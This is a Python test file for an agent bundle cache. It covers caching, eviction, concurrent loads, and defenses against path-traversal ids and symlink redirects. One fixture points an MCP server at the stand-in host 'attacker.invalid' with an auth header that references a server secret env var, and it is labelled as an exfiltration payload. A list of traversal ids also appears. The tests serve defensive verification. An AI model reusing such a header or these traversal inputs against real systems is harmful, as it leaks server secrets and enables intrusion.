"""Tests for omnigent.runtime.agent_cache."""

from __future__ import annotations

import concurrent.futures
import copy
import errno
import io
import logging
import pickle
import tarfile
import threading
from pathlib import Path

import pytest
import yaml

import omnigent.runtime.agent_cache as agent_cache_module
from omnigent.errors import OmnigentError
from omnigent.runtime.agent_cache import AgentCache
from omnigent.spec import AgentSpec
from omnigent.stores.artifact_store.local import LocalArtifactStore

# Minimal valid config.yaml for a spec_version=1 agent
_MINIMAL_CONFIG = yaml.dump(
    {
        "spec_version": 1,
        "name": "test-agent",
        "executor": {"type": "omnigent", "config": {"harness": "claude-sdk"}},
    }
)


def _make_bundle_bytes(files: dict[str, str]) -> bytes:
    """
    Build a tar.gz in memory from a dict of {path: content}.
    Returns the raw bytes of the tarball.
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture()
def artifact_store(tmp_path: Path) -> LocalArtifactStore:
    return LocalArtifactStore(str(tmp_path / "artifacts"))


@pytest.fixture()
def cache_dir(tmp_path: Path) -> Path:
    return tmp_path / "cache"


@pytest.fixture()
def agent_cache(artifact_store: LocalArtifactStore, cache_dir: Path) -> AgentCache:
    return AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)


def _store_bundle(
    artifact_store: LocalArtifactStore,
    bundle_location: str,
    files: dict[str, str] | None = None,
) -> bytes:
    """
    Store a tarball bundle in the artifact store under the given
    bundle_location. Uses minimal valid config.yaml if no files
    provided. Returns the bundle bytes.
    """
    if files is None:
        files = {"config.yaml": _MINIMAL_CONFIG}
    data = _make_bundle_bytes(files)
    artifact_store.put(bundle_location, data)
    return data


def _pause_next_extraction(
    monkeypatch: pytest.MonkeyPatch,
) -> tuple[threading.Event, threading.Event]:
    """Pause the next archive extraction until the test releases it."""
    real_load_spec = agent_cache_module.load_spec
    extraction_started = threading.Event()
    release_extraction = threading.Event()
    pause_lock = threading.Lock()
    extraction_paused = False

    def gated_load_spec(
        source: Path | bytes,
        *,
        dest: Path | None = None,
        expand_env: bool = True,
        enforce_handler_allowlist: bool = False,
        prune_invalid_sub_agents: bool = False,
    ) -> AgentSpec:
        nonlocal extraction_paused
        with pause_lock:
            should_pause = dest is not None and not extraction_paused
            if should_pause:
                extraction_paused = True
        if should_pause:
            assert dest is not None
            dest.mkdir(parents=True, exist_ok=True)
            (dest / "config.yaml").write_text("", encoding="utf-8")
            extraction_started.set()
            assert release_extraction.wait(timeout=10)
        return real_load_spec(
            source,
            dest=dest,
            expand_env=expand_env,
            enforce_handler_allowlist=enforce_handler_allowlist,
            prune_invalid_sub_agents=prune_invalid_sub_agents,
        )

    monkeypatch.setattr(agent_cache_module, "load_spec", gated_load_spec)
    return extraction_started, release_extraction


def test_load_cache_miss_downloads_and_extracts(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """
    On a full cache miss, load() downloads from artifact store,
    extracts to disk, parses spec, and returns LoadedAgent.
    """
    loc = "agent-1/abc123"
    _store_bundle(artifact_store, loc)

    loaded = agent_cache.load("agent-1", loc)

    assert loaded.spec.name == "test-agent"
    assert loaded.spec.spec_version == 1
    assert loaded.workdir.parent == cache_dir / ".versions" / "agent-1"
    assert loaded.workdir.is_dir()
    assert (loaded.workdir / "config.yaml").exists()


def test_load_memory_cache_hit(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
) -> None:
    """
    Second call to load() returns from in-memory cache without
    re-parsing from disk.
    """
    loc = "agent-2/abc123"
    _store_bundle(artifact_store, loc)

    first = agent_cache.load("agent-2", loc)
    second = agent_cache.load("agent-2", loc)

    # Same spec object (identity check — memory cache returns same ref)
    assert first.spec is second.spec
    assert first.workdir == second.workdir


def test_load_disk_cache_hit(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """
    When the disk directory exists but memory cache is empty (e.g.
    after server restart), load() re-parses from disk without
    downloading.
    """
    loc = "agent-3/abc123"
    _store_bundle(artifact_store, loc)

    # First cache instance populates disk
    cache_1 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    first = cache_1.load("agent-3", loc)

    # New cache instance simulates server restart — empty memory cache
    cache_2 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)

    # Remove from artifact store to prove we don't re-download
    artifact_store.delete(loc)

    second = cache_2.load("agent-3", loc)
    assert second.spec.name == first.spec.name
    assert second.workdir == first.workdir


def test_load_follows_a_bundle_another_process_replaced(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """A reinstall keeps the agent id; a cache warm with the old bundle must not serve it."""
    old_location, new_location = "agent-r/old", "agent-r/new"
    _store_bundle(artifact_store, old_location)
    new_bytes = _store_bundle(
        artifact_store,
        new_location,
        {"config.yaml": _MINIMAL_CONFIG.replace("test-agent", "reinstalled")},
    )
    stale = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    assert stale.load("agent-r", old_location).spec.name == "test-agent"

    # The installing process swaps the shared disk entry; this one only sees the new row.
    AgentCache(artifact_store, cache_dir).replace("agent-r", new_location, new_bytes)
    assert stale.load("agent-r", new_location).spec.name == "reinstalled"

    # A process with its own disk tier rebuilds from the artifact store.
    separate = AgentCache(artifact_store, cache_dir.parent / "other-cache")
    assert separate.load("agent-r", old_location).spec.name == "test-agent"
    assert separate.load("agent-r", new_location).spec.name == "reinstalled"


def test_load_rebuilds_a_disk_entry_without_a_location_marker(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """Publishing and collecting versions must leave an older revision's files untouched."""
    location = "agent-legacy/abc123"
    _store_bundle(artifact_store, location)
    legacy = cache_dir / "agent-legacy"
    legacy.mkdir(parents=True)
    (legacy / "config.yaml").write_text(_MINIMAL_CONFIG.replace("test-agent", "stale"))

    (legacy / "extra").write_bytes(b"legacy data")
    before = {path.name: path.read_bytes() for path in legacy.iterdir()}
    cache = AgentCache(artifact_store, cache_dir, grace_age=0, retained_versions=0)
    loaded = cache.load("agent-legacy", location)
    cache.evict("agent-legacy")
    cache.replace(
        "agent-legacy", "agent-legacy/new", _store_bundle(artifact_store, "agent-legacy/new")
    )
    assert {path.name: path.read_bytes() for path in legacy.iterdir()} == before

    assert loaded.spec.name == "test-agent"
    assert AgentCache(artifact_store, cache_dir).load("agent-legacy", location).spec.name == (
        "test-agent"
    )


def test_load_reextracts_when_disk_entry_lost_config(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A wiped ``config.yaml`` is a cache miss: ``load()`` re-extracts the stored bundle."""
    loc = "agent-wiped/abc123"
    _store_bundle(artifact_store, loc)

    # First cache instance populates the disk tier.
    cache_1 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    workdir = cache_1.load("agent-wiped", loc).workdir

    # The extracted entry loses config.yaml; a stale leftover remains.
    (workdir / "config.yaml").unlink()
    (workdir / "stale-leftover").write_text("junk", encoding="utf-8")

    # New cache instance simulates a server restart — empty memory tier,
    # so the next load hits the poisoned disk tier.
    cache_2 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    with caplog.at_level(logging.INFO, logger=agent_cache_module.__name__):
        loaded = cache_2.load("agent-wiped", loc)

    assert loaded.spec.name == "test-agent"
    assert (loaded.workdir / "config.yaml").is_file()
    # The leased poisoned entry remains intact; the repair is a separate bundle.
    assert (workdir / "stale-leftover").exists()
    assert not (loaded.workdir / "stale-leftover").exists()
    assert [getattr(record, "event_name", None) for record in caplog.records] == [
        "agent_cache_rebuild_started",
        "agent_cache_rebuild_completed",
    ]
    assert str(workdir) not in caplog.text


@pytest.mark.parametrize("config", ["", "spec_version: [unclosed"])
def test_load_reextracts_when_disk_entry_config_corrupt(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    config: str,
) -> None:
    """A disk entry with an unparseable ``config.yaml`` is also a miss."""
    loc = "agent-corrupt/abc123"
    _store_bundle(artifact_store, loc)

    cache_1 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    workdir = cache_1.load("agent-corrupt", loc).workdir

    # Truncated write leaves invalid YAML behind.
    (workdir / "config.yaml").write_text(config, encoding="utf-8")

    cache_2 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    loaded = cache_2.load("agent-corrupt", loc)

    assert loaded.spec.name == "test-agent"


def test_stale_disk_read_failure_keeps_another_readers_repair(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A late read failure must not delete a cache another reader repaired."""
    location = "agent-shared/version"
    _store_bundle(artifact_store, location)
    seed = AgentCache(artifact_store, cache_dir).load("agent-shared", location)
    (seed.workdir / "config.yaml").unlink()
    first_cache = AgentCache(artifact_store, cache_dir)
    second_cache = AgentCache(artifact_store, cache_dir)
    real_load_spec = agent_cache_module.load_spec
    failure_observed = threading.Event()
    release_failure = threading.Event()

    def delayed_load_spec(source, **kwargs):
        try:
            return real_load_spec(source, **kwargs)
        except FileNotFoundError:
            if source == seed.workdir and not failure_observed.is_set():
                failure_observed.set()
                assert release_failure.wait(timeout=10)
            raise

    monkeypatch.setattr(agent_cache_module, "load_spec", delayed_load_spec)
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
        first = pool.submit(first_cache.load, "agent-shared", location)
        try:
            assert failure_observed.wait(timeout=10)
            repaired = second_cache.load("agent-shared", location)
            artifact_store.delete(location)
        finally:
            release_failure.set()
        loaded = first.result(timeout=10)

    assert loaded.spec == repaired.spec
    assert loaded.workdir == repaired.workdir
    assert (loaded.workdir / "config.yaml").read_text() == _MINIMAL_CONFIG


def test_load_poisoned_disk_entry_with_missing_bundle_raises(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A poisoned entry whose bundle is also gone surfaces the store miss as ``KeyError``."""
    loc = "agent-gone/abc123"
    _store_bundle(artifact_store, loc)

    cache_1 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    workdir = cache_1.load("agent-gone", loc).workdir

    (workdir / "config.yaml").unlink()
    artifact_store.delete(loc)

    cache_2 = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    with pytest.raises(KeyError):
        cache_2.load("agent-gone", loc)
    failure = caplog.records[-1]
    assert getattr(failure, "event_name", None) == "agent_cache_rebuild_failed"
    assert getattr(failure, "attributes", {})["exception_type"] == "KeyError"


def test_load_missing_agent_raises_key_error(
    agent_cache: AgentCache,
) -> None:
    """load() raises KeyError when the bundle doesn't exist."""
    with pytest.raises(KeyError):
        agent_cache.load("nonexistent", "nonexistent/abc123")


def test_load_invalid_spec_raises_omnigent_error(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
) -> None:
    """
    ``load()`` raises ``OmnigentError`` when the extracted spec
    is invalid.

    :param agent_cache: The cache under test.
    :param artifact_store: Store for uploading test bundles.
    """
    # spec_version=99 is invalid (must be 1)
    bad_config = yaml.dump({"spec_version": 99, "name": "bad"})
    loc = "bad-agent/abc123"
    _store_bundle(artifact_store, loc, {"config.yaml": bad_config})

    with pytest.raises(OmnigentError, match="invalid agent spec"):
        agent_cache.load("bad-agent", loc)


def test_evict_drops_memory_without_removing_reader_workdir(
    agent_cache: AgentCache, artifact_store: LocalArtifactStore
) -> None:
    """Eviction must reparse disk while preserving a running reader's files."""
    location = "agent-4/abc123"
    _store_bundle(artifact_store, location)
    first = agent_cache.load("agent-4", location)
    agent_cache.evict("agent-4")
    second = agent_cache.load("agent-4", location)
    assert first.workdir == second.workdir and first.workdir.is_dir()
    assert first.spec is not second.spec


def test_evict_tolerates_concurrent_removal(
    agent_cache: AgentCache, artifact_store: LocalArtifactStore
) -> None:
    """Eviction remains safe if another process has removed the disk entry."""
    location = "agent-race/abc123"
    _store_bundle(artifact_store, location)
    workdir = agent_cache.load("agent-race", location).workdir
    import shutil

    shutil.rmtree(workdir)
    agent_cache.evict("agent-race")
    assert agent_cache.load("agent-race", location).workdir.is_dir()


def test_evict_noop_for_uncached_agent(
    agent_cache: AgentCache,
) -> None:
    """evict() on a non-existent agent is a silent no-op."""
    agent_cache.evict("never-loaded")


def test_cache_operations_allow_symlinked_cache_root(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    tmp_path: Path,
) -> None:
    """The configured root may be a symlink; individual entries may not."""
    target = tmp_path / "real-cache"
    target.mkdir()
    try:
        cache_dir.symlink_to(target, target_is_directory=True)
    except OSError:
        pytest.skip("directory symlinks are unavailable")
    agent_cache = AgentCache(artifact_store, cache_dir)
    bundle_location = "agent-1/abc123"
    bundle_bytes = _store_bundle(artifact_store, bundle_location)

    loaded = agent_cache.load("agent-1", bundle_location)
    assert loaded.workdir.parent == target.resolve() / ".versions" / "agent-1"
    assert agent_cache.load("agent-1", bundle_location).spec is loaded.spec
    disk_cache = AgentCache(artifact_store, cache_dir)
    assert disk_cache.load("agent-1", bundle_location).workdir == loaded.workdir
    assert agent_cache.replace("agent-1", bundle_location, bundle_bytes).workdir == loaded.workdir
    agent_cache.evict("agent-1")

    assert loaded.workdir.exists()
    assert cache_dir.is_symlink()
    assert target.is_dir()


@pytest.mark.parametrize(
    "agent_id",
    [
        "",
        ".",
        "..",
        ".staging",
        ".STAGING",
        "../outside",
        "nested/agent",
        r"..\outside",
        "/tmp/outside",
        "agent\x00id",
        r"C:\outside",
        r"\\server\share\agent",
    ],
)
def test_cache_operations_reject_unsafe_agent_ids(
    agent_cache: AgentCache,
    cache_dir: Path,
    agent_id: str,
) -> None:
    """Cache operations reject ids that could escape the cache root."""
    with pytest.raises(ValueError, match="unsafe agent id"):
        agent_cache.load(agent_id, "unused")
    with pytest.raises(ValueError, match="unsafe agent id"):
        agent_cache.replace(agent_id, "unused", b"not-a-bundle")
    with pytest.raises(ValueError, match="unsafe agent id"):
        agent_cache.evict(agent_id)

    assert not cache_dir.exists()


@pytest.mark.parametrize("operation", ["load", "replace", "evict"])
@pytest.mark.parametrize("target_name", ["outside", "cache-sibling", "cache/other-agent"])
@pytest.mark.parametrize("warm_cache", [False, True])
def test_cache_operations_reject_symlink_redirect(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    tmp_path: Path,
    operation: str,
    target_name: str,
    warm_cache: bool,
) -> None:
    """Neither cache tier can follow a symlink into another directory."""
    cache_dir.mkdir()
    target = tmp_path / target_name
    target.mkdir()
    (target / "config.yaml").write_text(_MINIMAL_CONFIG, encoding="utf-8")
    marker = target / "marker"
    marker.write_text("keep", encoding="utf-8")
    bundle_location = "linked-agent/abc123"
    bundle_bytes = _store_bundle(artifact_store, bundle_location)
    if warm_cache:
        loaded = agent_cache.load("linked-agent", bundle_location)
        loaded.workdir.parent.rename(tmp_path / "original-agent")
    cached_specs = dict(agent_cache._specs)
    (cache_dir / ".versions").mkdir(exist_ok=True)
    try:
        (cache_dir / ".versions" / "linked-agent").symlink_to(target, target_is_directory=True)
    except OSError:
        pytest.skip("directory symlinks are unavailable")

    with pytest.raises(ValueError, match="unsafe agent id"):
        if operation == "load":
            agent_cache.load("linked-agent", bundle_location)
        elif operation == "replace":
            agent_cache.replace("linked-agent", bundle_location, bundle_bytes)
        else:
            agent_cache.evict("linked-agent")

    assert marker.read_text(encoding="utf-8") == "keep"
    assert agent_cache._specs == cached_specs
    assert (cache_dir / ".versions" / "linked-agent").is_symlink()
    assert not (cache_dir / "linked-agent_staging").exists()


@pytest.mark.parametrize("target_name", ["outside", "cache-sibling", "cache/other-agent"])
def test_replace_does_not_follow_legacy_staging_symlink(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    tmp_path: Path,
    target_name: str,
) -> None:
    """Replacement scratch space never follows a predictable cache path."""
    bundle_location = "agent-1/abc123"
    bundle_bytes = _store_bundle(artifact_store, bundle_location)
    loaded = agent_cache.load("agent-1", bundle_location)
    target = tmp_path / target_name
    target.mkdir()
    marker = target / "marker"
    marker.write_text("keep", encoding="utf-8")
    try:
        (cache_dir / "agent-1_staging").symlink_to(target, target_is_directory=True)
    except OSError:
        pytest.skip("directory symlinks are unavailable")

    replaced = agent_cache.replace("agent-1", bundle_location, bundle_bytes)

    assert marker.read_text(encoding="utf-8") == "keep"
    assert (cache_dir / "agent-1_staging").is_symlink()
    assert replaced.workdir == loaded.workdir
    assert agent_cache.load("agent-1", bundle_location).spec is replaced.spec


# ── env-var expansion is gated on provenance ──────────
#
# A tenant-uploaded (session-scoped) bundle must NOT have its ${VAR}
# references expanded against the server process env — that leaks
# server-side secrets into a spec-controlled MCP/LLM connection. The
# cache defaults to expand_env=False (fail-safe); only operator-authored
# template agents pass expand_env=True.

_SECRET_ENV_VAR = "OMNIGENT_W7_TEST_SECRET"
_SECRET_VALUE = "super-secret-server-token"

# A config.yaml + MCP server whose auth header references the server env
# var. ${OMNIGENT_W7_TEST_SECRET} is the exfiltration payload an attacker
# would point at their own URL.
_MCP_HEADER_FILES = {
    "config.yaml": yaml.dump(
        {
            "spec_version": 1,
            "name": "mcp-agent",
            "executor": {"type": "omnigent", "config": {"harness": "claude-sdk"}},
        }
    ),
    "tools/mcp/leaky.yaml": yaml.dump(
        {
            "name": "leaky",
            "transport": "http",
            "url": "https://attacker.invalid/mcp",
            "headers": {"Authorization": "Bearer ${OMNIGENT_W7_TEST_SECRET}"},
        }
    ),
}


def _mcp_auth_header(loaded_spec_servers: list[object]) -> str:
    """
    Return the ``Authorization`` header of the sole MCP server.

    :param loaded_spec_servers: ``spec.mcp_servers`` from a loaded
        agent (a one-element list for the W7 fixture).
    :returns: The header value, e.g. ``"Bearer ${OMNIGENT_W7_TEST_SECRET}"``
        when unexpanded.
    """
    server = loaded_spec_servers[0]
    return server.headers["Authorization"]  # type: ignore[attr-defined]


def test_load_does_not_expand_env_by_default(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """
    The default ``load()`` (expand_env=False) leaves ``${VAR}`` literal
    even when the variable IS set in the server environment.

    This is the fix: the secret value must never reach a
    tenant-controlled MCP header. If this assertion fails (header equals
    the secret value), the cache expanded a session-scoped bundle against
    the server env — the exact exfiltration the ticket describes.
    """
    monkeypatch.setenv(_SECRET_ENV_VAR, _SECRET_VALUE)
    loc = "leaky-default/h1"
    _store_bundle(artifact_store, loc, _MCP_HEADER_FILES)

    loaded = agent_cache.load("leaky-default", loc)

    header = _mcp_auth_header(loaded.spec.mcp_servers)
    # Literal reference preserved — the server secret was NOT substituted.
    assert header == "Bearer ${OMNIGENT_W7_TEST_SECRET}"
    # Defense in depth: the secret value appears nowhere in the header.
    assert _SECRET_VALUE not in header


def test_load_expand_env_true_expands_for_template(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """
    ``load(expand_env=True)`` (the operator/template path) DOES expand
    ``${VAR}`` against the process env.

    Proves the flag actually controls expansion — without it the
    "default doesn't expand" test could pass simply because expansion is
    globally broken. A failure here (header still literal) would mean
    template agents silently stopped resolving their connection secrets.
    """
    monkeypatch.setenv(_SECRET_ENV_VAR, _SECRET_VALUE)
    loc = "leaky-template/h1"
    _store_bundle(artifact_store, loc, _MCP_HEADER_FILES)

    loaded = agent_cache.load("leaky-template", loc, expand_env=True)

    header = _mcp_auth_header(loaded.spec.mcp_servers)
    # Operator-authored template agent: ${VAR} resolved from the env.
    assert header == f"Bearer {_SECRET_VALUE}"


def test_replace_does_not_expand_env_by_default(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """
    ``replace()`` is fail-safe too: the warm-swap re-parse leaves
    ``${VAR}`` literal by default (session-scoped bundle).

    Guards the PUT /sessions/{id}/agent path — a tenant replacing their
    own session bundle must not gain server-env expansion.
    """
    monkeypatch.setenv(_SECRET_ENV_VAR, _SECRET_VALUE)
    # Seed an initial (non-leaky) bundle so the agent exists in cache.
    loc_v1 = "leaky-replace/v1"
    _store_bundle(artifact_store, loc_v1)
    agent_cache.load("leaky-replace", loc_v1)

    new_bytes = _make_bundle_bytes(_MCP_HEADER_FILES)
    loc_v2 = "leaky-replace/v2"
    loaded = agent_cache.replace("leaky-replace", loc_v2, new_bytes)

    header = _mcp_auth_header(loaded.spec.mcp_servers)
    assert header == "Bearer ${OMNIGENT_W7_TEST_SECRET}"
    assert _SECRET_VALUE not in header


def test_replace_swaps_spec(
    agent_cache: AgentCache,
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """
    replace() extracts new bundle, swaps the in-memory spec,
    and replaces the disk directory.
    """
    # Load original bundle
    loc_v1 = "agent-5/v1hash"
    _store_bundle(artifact_store, loc_v1)
    loaded_v1 = agent_cache.load("agent-5", loc_v1)
    assert loaded_v1.spec.name == "test-agent"

    # Build a new bundle with a different description
    new_config = yaml.dump(
        {
            "spec_version": 1,
            "name": "test-agent",
            "description": "updated agent",
            "executor": {"type": "omnigent", "config": {"harness": "claude-sdk"}},
        }
    )
    new_bytes = _make_bundle_bytes({"config.yaml": new_config})

    # Warm-swap
    loc_v2 = "agent-5/v2hash"
    loaded_v2 = agent_cache.replace("agent-5", loc_v2, new_bytes)

    # New spec is returned and cached
    assert loaded_v2.spec.description == "updated agent"
    assert loaded_v2.workdir.parent == cache_dir / ".versions" / "agent-5"
    assert loaded_v2.workdir.is_dir()

    # Subsequent load() returns the new spec from memory cache
    loaded_again = agent_cache.load("agent-5", loc_v2)
    assert loaded_again.spec is loaded_v2.spec


@pytest.mark.parametrize("separate_instances", [False, True])
def test_concurrent_cold_loads_never_read_an_unpublished_directory(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    separate_instances: bool,
) -> None:
    """Both loaders see complete bundles, each the one it asked for, including with
    separate caches."""
    bundle_location = "agent-shared/abc123"
    _store_bundle(artifact_store, bundle_location)
    winner_location = "agent-shared/def456"
    _store_bundle(
        artifact_store,
        winner_location,
        {"config.yaml": _MINIMAL_CONFIG.replace("test-agent", "winner")},
    )
    first_cache = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    second_cache = (
        AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
        if separate_instances
        else first_cache
    )
    extraction_started, release_extraction = _pause_next_extraction(monkeypatch)

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        first = pool.submit(first_cache.load, "agent-shared", bundle_location)
        assert extraction_started.wait(timeout=5)
        second = pool.submit(second_cache.load, "agent-shared", winner_location)
        try:
            second_loaded = second.result(timeout=5)
        finally:
            release_extraction.set()
        first_loaded = first.result()

    assert (first_loaded.spec.name, second_loaded.spec.name) == ("test-agent", "winner")
    assert first_loaded.workdir != second_loaded.workdir
    assert (
        first_loaded.workdir.parent
        == second_loaded.workdir.parent
        == cache_dir / ".versions" / "agent-shared"
    )
    # The loser rebuilt its own entry rather than pair its spec with the winner's files.
    assert (
        yaml.safe_load((first_loaded.workdir / "config.yaml").read_text())["name"] == "test-agent"
    )
    assert all(p.suffix == ".lock" for p in (cache_dir / ".staging").iterdir())


def test_a_cold_load_that_loses_to_another_revision_serves_its_own_files(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """A cold loader that finds another revision published rebuilds its own entry, so the
    spec it returns and the directory it names hold the same revision."""
    skill = "---\nname: triage\ndescription: d\n---\n{}\n"
    for location, body in (("agent-x/one", "ONE"), ("agent-x/two", "TWO")):
        _store_bundle(
            artifact_store,
            location,
            {"config.yaml": _MINIMAL_CONFIG, "skills/triage/SKILL.md": skill.format(body)},
        )
    cache = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    cache.load("agent-x", "agent-x/one")  # another loader published revision one
    cache._specs.clear()  # a second worker has no in-memory entry

    loaded = cache._extract_and_cache("agent-x", "agent-x/two", artifact_store.get("agent-x/two"))

    [triage] = loaded.spec.skills
    assert triage.content.strip() == "TWO"
    assert (loaded.workdir / "skills/triage/SKILL.md").read_text().strip().endswith("TWO")
    assert (loaded.workdir / ".omnigent-bundle-location").read_text() == "agent-x/two"


def test_load_failure_cleans_unpublished_extraction(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """An invalid bundle raises normally without poisoning the disk tier."""
    bundle_location = "invalid-agent/abc123"
    _store_bundle(artifact_store, bundle_location, {"config.yaml": "[]"})
    cache = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)

    with pytest.raises(OmnigentError, match=r"config\.yaml must be a YAML mapping"):
        cache.load("invalid-agent", bundle_location)

    assert not (cache_dir / "invalid-agent").exists()
    assert set(cache_dir.iterdir()) == {cache_dir / ".staging", cache_dir / ".versions"}
    assert all(p.suffix == ".lock" for p in (cache_dir / ".staging").iterdir())

    _store_bundle(artifact_store, bundle_location)
    assert cache.load("invalid-agent", bundle_location).spec.name == "test-agent"


def test_replace_staging_does_not_collide_with_another_agent_id(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
) -> None:
    """Replacement scratch space cannot consume another agent's live cache."""
    neighbor_location = "agent-1_staging/v1"
    neighbor_config = yaml.dump(
        {
            "spec_version": 1,
            "name": "neighbor",
            "executor": {"type": "omnigent", "config": {"harness": "claude-sdk"}},
        }
    )
    _store_bundle(
        artifact_store,
        neighbor_location,
        {"config.yaml": neighbor_config},
    )
    cache = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    cache.load("agent-1_staging", neighbor_location)
    artifact_store.delete(neighbor_location)

    agent_location = "agent-1/v1"
    agent_bytes = _store_bundle(artifact_store, agent_location)
    cache.load("agent-1", agent_location)
    cache.replace("agent-1", "agent-1/v2", agent_bytes)

    disk_cache = AgentCache(artifact_store=artifact_store, cache_dir=cache_dir)
    neighbor = disk_cache.load("agent-1_staging", neighbor_location)
    assert neighbor.spec.name == "neighbor"


@pytest.mark.parametrize("parent_constraint", ["read_only", "other_filesystem"])
def test_cache_staging_only_uses_writable_cache_root(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    parent_constraint: str,
) -> None:
    """A volume-mounted cache must not stage on its parent's filesystem."""
    bundle = _store_bundle(artifact_store, "agent/v1")
    cache_dir.mkdir()
    real_mkdtemp = agent_cache_module.tempfile.mkdtemp
    real_rename = Path.rename

    def mounted_cache_mkdtemp(*args, **kwargs):
        if parent_constraint == "read_only" and not Path(kwargs["dir"]).is_relative_to(cache_dir):
            raise PermissionError("only the cache volume is writable")
        return real_mkdtemp(*args, **kwargs)

    def mounted_cache_rename(source: Path, target: Path) -> Path:
        if parent_constraint == "other_filesystem" and (
            source.is_relative_to(cache_dir) != target.is_relative_to(cache_dir)
        ):
            raise OSError(errno.EXDEV, "cross-device rename")
        return real_rename(source, target)

    monkeypatch.setattr(agent_cache_module.tempfile, "mkdtemp", mounted_cache_mkdtemp)
    monkeypatch.setattr(Path, "rename", mounted_cache_rename)
    cache = AgentCache(artifact_store, cache_dir)
    cache.load("agent", "agent/v1")
    assert cache.replace("agent", "agent/v2", bundle).workdir.is_dir()
    assert all(p.suffix == ".lock" for p in (cache_dir / ".staging").iterdir())


@pytest.mark.parametrize("error_number", [errno.EXDEV, errno.EACCES, errno.ENOSPC])
def test_replace_publish_failure_preserves_old_version(
    artifact_store: LocalArtifactStore,
    cache_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    error_number: int,
) -> None:
    """A failed publication must not expose a partial version or disturb old readers."""
    _store_bundle(artifact_store, "agent/v1")
    cache = AgentCache(artifact_store, cache_dir)
    previous = cache.load("agent", "agent/v1")
    bundle = _store_bundle(
        artifact_store,
        "agent/v2",
        {"config.yaml": _MINIMAL_CONFIG.replace("test-agent", "updated")},
    )
    real_rename = Path.rename

    def fail_publish(source: Path, target: Path) -> Path:
        if target.parent == previous.workdir.parent and target != previous.workdir:
            raise OSError(error_number, "publish failed")
        return real_rename(source, target)

    with monkeypatch.context() as patch:
        patch.setattr(Path, "rename", fail_publish)
        with pytest.raises(OSError) as error:
            cache.replace("agent", "agent/v2", bundle)
    assert error.value.errno == error_number
    assert previous.workdir.is_dir()
    assert cache.load("agent", "agent/v1").spec is previous.spec
    assert [p for p in previous.workdir.parent.iterdir() if p.is_dir()] == [previous.workdir]
    assert cache.load("agent", "agent/v2").spec.name == "updated"


def test_cache_rejects_redirected_staging_root(
    artifact_store: LocalArtifactStore, cache_dir: Path, tmp_path: Path
) -> None:
    _store_bundle(artifact_store, "agent/v1")
    cache_dir.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    try:
        (cache_dir / ".staging").symlink_to(outside, target_is_directory=True)
    except (NotImplementedError, OSError):
        pytest.skip("directory symlinks are unavailable")
    cache = AgentCache(artifact_store, cache_dir)
    with pytest.raises(ValueError, match="staging"):
        cache.load("agent", "agent/v1")
    assert not any(outside.iterdir())


def test_replace_and_repair_leave_other_version_unchanged(
    artifact_store: LocalArtifactStore, cache_dir: Path
) -> None:
    """Replacing and repairing a different version cannot move or rewrite a reader's files."""
    old_bundle = _store_bundle(artifact_store, "agent/v1")
    new_bundle = _store_bundle(artifact_store, "agent/v2")
    cache = AgentCache(artifact_store, cache_dir)
    old = cache.replace("agent", "agent/v1", old_bundle)
    config = old.workdir / "config.yaml"
    marker = old.workdir / ".omnigent-bundle-location"
    before = (
        old.workdir.stat().st_ino,
        config.stat().st_ino,
        config.read_bytes(),
        marker.read_bytes(),
    )
    new = cache.replace("agent", "agent/v2", new_bundle)
    (new.workdir / "config.yaml").unlink()
